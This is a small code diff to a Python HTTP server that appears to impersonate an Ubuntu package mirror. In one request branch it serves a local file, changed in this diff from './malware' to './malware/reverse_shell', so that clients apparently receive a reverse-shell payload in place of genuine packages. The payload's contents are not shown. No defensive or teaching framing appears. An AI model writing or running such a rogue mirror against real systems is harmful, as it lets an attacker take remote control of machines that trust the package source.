@@ -1,6 +1,6 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import requests
-import hashlib
+# import hashlib
 
 base_url = "http://nl.archive.ubuntu.com"
 
@@ -28,7 +28,7 @@ class Server(BaseHTTPRequestHandler):
         else:
             self.send_response(200)
             self.end_headers()
-            f = open("./malware", "rb")
+            f = open("./malware/reverse_shell", "rb")
             content = f.read()
             print(content)
             self.wfile.write(content)
